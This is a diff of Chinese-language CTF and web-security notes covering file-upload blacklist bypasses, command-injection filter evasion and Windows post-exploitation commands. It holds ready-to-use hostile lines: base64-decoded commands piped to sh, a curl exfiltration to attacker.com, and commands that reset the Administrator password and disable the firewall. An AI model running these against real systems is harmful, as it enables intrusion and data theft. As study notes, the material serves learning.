@@ -25,7 +25,7 @@ SELECT group_concat(convert(column_name using gbk)) FROM information_schema.colu
 
 - 后缀黑名单绕过
   - 大小写，双写
-  - 冷门后缀：php可能解析`php5` / `pht` / `phtml` / `shtml` / `pwml`；jsp可能解析`jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀；asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀；`vbs, sh, reg, com, cgi, exe, cfc, cfm`等后缀也可能可以利用。较新版本的服务器基本不可能成功
+  - 冷门后缀：php可能解析`php5, pht, phtml, shtml, pwml, phar`；jsp可能解析`jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀；asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀；`vbs, sh, reg, com, cgi, exe, cfc, cfm`等后缀也可能可以利用。较新版本的服务器基本不可能成功
   - 系统命名绕过：Windows系统可尝试`shell.php.`（末尾句点）、`shell.php%20`（末尾空格）、`shell.php:1.jpg`（冒号）、`shell.php::$DATA`（文件流）；Linux系统可尝试`index.php/.`、`./aa/../index.php/.`
   - **`.user.ini`文件**：适用于PHP 5.3以上，需要服务器处于CGI / Fast CGI模式，且上传目录下有PHP脚本，比如index.php。构造配置文件`auto_prepend_file=01.gif`，访问同一目录的php脚本时自动运行`01.gif`
   - **`.htaccess`文件**：适用于apache服务器，需要服务器配置`AllowOverride`（也有说法称需要开启`rewrite`模块、需要Thread Safe版本PHP）
@@ -92,29 +92,49 @@ PHP标签过滤：可以考虑使用`<script language="PHP"></script>`
 
 ### 基础知识
 
-截断符号：继续执行`;`、管道符`|`、后台执行`&`、逻辑运算`||, &&`、换行符``。还可能用括号、引号闭合语句注入
+截断符号：继续执行`;`、管道符`|`、后台执行`&`、逻辑运算`||, &&`、换行符`\`。还可能用括号、引号闭合语句注入
 
 Shell扩展：参考[Linux笔记](../system/Linux.md#Shell扩展)
 
 ### 绕过技巧
 
 - 关键字过滤：可能限制指令、特殊字符、文件名
-  - 类似指令。查看文件：`cat, tac, less, more, head, tail, nl, sort, rev, grep`；读取并编码：`od, base64, xxd`；文本编辑：`vi, vim, nano`
+  - 类似指令。查看文件：`cat, tac, less, more, head, tail, nl, sort, rev, grep, strings`；读取并编码：`od, base64, xxd`；文本编辑：`vi, vim, nano`；`awk {print} flag.txt`；`sed -n p flag.txt`
   - 编码绕过：`echo "Y2F0IGZsYWcudHh0" | base64 -d | sh`，`echo 63617420666c61672e706870 | xxd -r -p | bash`
-  - Shell扩展引号移除绕过：`c""at fla\g.txt`
-  - Shell扩展文件名扩展绕过：`cat f[k-m]a?.txt`
-  - Shell扩展参数扩展绕过：`a=ca;${a}t flag.txt`
+  - Shell扩展绕过
+    - 引号移除：`c""at fla\g.txt`
+    - 文件名扩展：`cat f[k-m]a?.txt`
+    - 参数扩展：`x=ca;y=b;$x$y fl$9ag.txt`。还可利用环境变量，如`${PATH:6:1}`取环境变量第6个字符
 - 空格过滤
   - 空白符`\t, ${IFS}, $IFS$9, %0d%0a`代替
-  - Shell扩展绕过：`{cat,flag.txt}`
+  - 大括号扩展绕过：`{cat,flag.txt}`
+  - 重定向绕过：`cat<flag.txt`
 - 长度限制
 - 回显限制
   - 用带外信息带出，如`curl http://attacker.com/$flag` 
   - 盲注
 
+以上大部分技巧适用于Linux。对于Windows系统命令提示符，还可尝试：
+
+- `^`绕过：`wh^oami`
+
 ## 其他
 
 伪造IP地址：`X-Forwarded-For, Client-IP, X-Real-IP, X-Remote-IP`
+
+### 提权
+
+```shell
+# Windows系统改密码
+net user Administrator $pw
+
+# 关闭防火墙
+netsh firewall set opmode disable
+
+# 查看回收站文件
+dir /a C:\$Recycle.Bin
+type C:\Recycle.Bin\path-to-file
+```
 
 # Crypto
 
